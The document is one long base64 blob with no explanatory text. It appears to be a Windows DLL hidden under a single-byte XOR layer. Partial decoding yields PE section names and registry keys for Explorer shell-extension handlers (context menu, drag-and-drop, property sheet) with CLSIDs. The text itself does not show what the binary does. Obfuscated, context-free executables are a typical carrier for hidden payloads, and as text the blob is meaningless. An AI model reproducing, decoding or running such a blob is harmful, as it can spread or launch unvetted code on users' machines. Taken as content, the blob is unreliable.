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OFhcXFxOKFRcXFxcXFxcXFxQXFxcHihUXpxcXFxcXFxcWFxcXNRKEDhYXFxe/ixUXFxcXFxcXFxcUFxcXp4sVFycXFxcXFxcXFhcXFzUShA4TFxcX04wVFxcXFxcXFxcXGhcXF+eMFRe/FxcXFxcXFxYXFxc1EoQOFRcXFzuMFRcXFxcXFxcXFxIXFxdXjBUXPxcXFxcXFxcWFxcXNRKEDhYXFxdfiRUXFxcXFxcXFxcUFxcXR4kVF7cXFxcXFxcXFhcXFzUShA4WFxcXw4kVFxcXFxcXFxcXEhcXF/eJFReHFxcXFxcXFxYXFxc1EoQOFhcXF8uIFRcXFxcXFxcXFxQXFxf/iBUXNxcXFxcXFxcWFxcXFxcXFyoBD00XFxcXGhcXF88VFxergBUXq2oVFxcXFxfvFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXB8cVlxYXFxcXFxcXFxcXFxcXFxcXFxcXN/IWlxYXFxc/8haXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXV9wWlxYXFxcn8haXFhcXFxcXFxcXFxcXL/IWlxYXFxcXFxcXFxcXF/syFpcWFxcXezIWlxYXFxcWFxcXFxcXFxcXFxcvyBUXZ4IVF1+CFRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcXn4IVFxcXFxcXFxcXj4IVFxcXFxcXFxcXFxcXFy/IFRcXFxcXFxcXF+jo6OgXFxcXVxcXF2eCFRcXFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxcHyBUX/4IVF9eCFRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXF4EVFxcXFxcXFxcXD4EVF4+CFRcXFxcXFxcXFxcXFxcXFxcXB8gVFxYXFxcXFxcX6Ojo6BcXFxdXFxcX/4IVFxcXFxcXFxcXFxcXFxYXFxcXFxcXFxcXF3fIFRd/gRUXV4EVFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxQXFxeXgRUXFxcXFxcXFxe3gRUXD4EVF4+CFRcXFxcXFxcXFxcXFxcXFxcXFxcXF3fIFRcVFxcXFxcXF+jo6OgXFxcXVxcXF3+BFRcXFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxeHyBUX54EVF9+BFRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcXH4AVFxcXFxcXFxcXD4AVFxcXFxcXFxcXFxcXF4fIFRcXFxcXFxcXF+jo6OgXFxcXVxcXF+eBFRcXFxcXFxcXFxcXFxcWFxcXFxcXFxcXFxenyBUXf4AVF1eAFRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcVFxcXl4AVFxcXFxcXFxcXj4AVF4+CFRcXFxcXFxcXFxcXFxcXFxcXp8gVFxYXFxcXFxcX6Ojo6BcXFxdXFxcXf4AVFxcXFxcXFxcXUFRDWxcHFxfrURcXOWNyb2MXFxfrQRcX4xcXFzljcm9jM3N+FxcXF+dAFxc3ZBYXOWNyb2MzenkXFxcXB9wWF/cXFxc5Y3JvYzN6eTMnJxfn3BYXRxMXFzljcm9jM28XV8cWF0kXFxc5Y3JvYzNucxcXFxcX9xYXNxIXFzl+c3ZjdjMiFxcXFzfyFhc3FxcXOScndHFwFxdX8hYXHxcXFzlURUMzT1RWFxcXF1/yFhcHFxcXOVRFQzNPVEIXFxcXT/IWFx8XFxc5VEVDM09UTRcXFxd38hYXHxcXFzlURUMzT15WFxcXF3/yFhcPFxcXOVRFQzNPXlQXFxcXl/IWFx8XFxc5VEVDM09eTRcXFxef8hYXHxcXFzlURUMzT0dWFxcXF4fyFhcHFxcXOVRFQzNPR08XFxcXt/IWFx8XFxc5VEVDM09HT1YXFxe/8hYXHxcXFzlURUMzT0dNFxcXF6fyFhcfFxcXOVRFQzNPQ1YXFxcXr/IWFx8XFxc5VEVDM09DTRcXFxfX8hYXn7gXFzllc3ZjdhcXX4IVF2MVFxc5ZXN2Y3YzZRcXFxergBUXyxUXFzllc3ZjdjNtbW1zdXAXFxePjRUXHxcXFzllY3QzXlZWFxcXF7eNFRcfFxcXOWVjdDNeTU0XFxcXv40VFx8XFxc5ZWN0M0NWVhcXFxenjRUXBxcXFzllY3QzQ01NFxcXF9eNFRe/ABcXOW9zdmN2Fxd/pRUXTxYXFzlvc3ZjdjNvFxcXF9ekFRcrFhcXOXJzdmN2FxfroxUXoxcXFzl+c3ZjdjM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